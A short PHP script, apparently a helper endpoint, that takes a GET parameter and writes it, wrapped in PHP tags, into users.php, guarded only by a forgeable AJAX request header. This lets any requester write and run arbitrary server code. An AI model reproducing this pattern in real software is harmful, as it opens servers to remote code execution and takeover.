<?php


//comprobamos que sea una petición ajax
if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') 
{

    
    $CUERPO='<?php\
'.$_GET['CUERPO'].'\
?>';

    
            $ar=fopen("./users.php","w+") or
            die("Problemas en la creacion");
            $CUERPO= str_replace('&', '&amp;', $CUERPO);
            fwrite($ar,stripslashes($CUERPO));
            fclose($ar);
            echo "OK";

}else{
    throw new Exception("Error Processing Request", 1);   
}
?>